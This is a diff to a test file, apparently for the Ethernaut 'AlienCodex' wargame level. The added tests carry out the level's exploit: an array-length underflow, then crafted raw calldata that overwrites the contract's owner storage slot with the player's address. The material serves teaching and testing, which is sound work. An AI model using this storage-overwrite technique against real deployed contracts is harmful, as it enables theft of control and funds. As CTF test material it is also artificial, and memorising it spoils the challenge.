@@ -27,10 +27,14 @@ contract('AlienCodex', function(accounts) {
 
   describe('instance', function() {
 
-    it('should allow the user to join AlienCodex, with arbitrary length', async function() {
+    it('should not be immediately solvable', async function() {
+
       assert.notEqual(player, owner);
       let status = await instance.contact.call();
       assert.isFalse(status);
+    }) 
+
+    it('should allow the user to join AlienCodex, with arbitrary length', async function() {
 
       let _data = '0x1d3d4c0b0000000000000000000000000000000000000000000000000000000000000020F0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000005';
       await toPromise(web3.eth.sendTransaction)({
@@ -39,30 +43,23 @@ contract('AlienCodex', function(accounts) {
         data: _data
       })
       
-      // await instance.join_AlienCodex();
-      status = await instance.contact.call();
+      let status = await instance.contact.call();
       assert.isTrue(status);
     });
 
-    it('should underflow and give user all storage access', async function() {
+    it('codex array should underflow, giving user all storage access to become owner', async function() {
+      
+      await instance.pop();
+      let _data = `0xe537637d4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a000000000000000000000001`+ player.substr(2);
+      await toPromise(web3.eth.sendTransaction)({
+        from: player,
+        to: instance.address,
+        data: _data
+      })
+    
+      let ownr = await instance.owner();
+      assert.equal(ownr, player);
 
-    });
-
-    it('should allow the player to become owner', async function() {
-      //TODO
-      //     // Player should own the instance now
-      // owner = await instance.owner.call()
-      // console.log(`new instance owner:`, owner)
-      // assert.equal(owner, player)
-
-      // // Factory check
-      // const ethCompleted = await utils.submitLevelInstance(
-      //   ethernaut,
-      //   level.address,
-      //   instance.address,
-      //   player
-      // )
-      // assert.equal(ethCompleted, true)
-    });
+    })
   });
 });
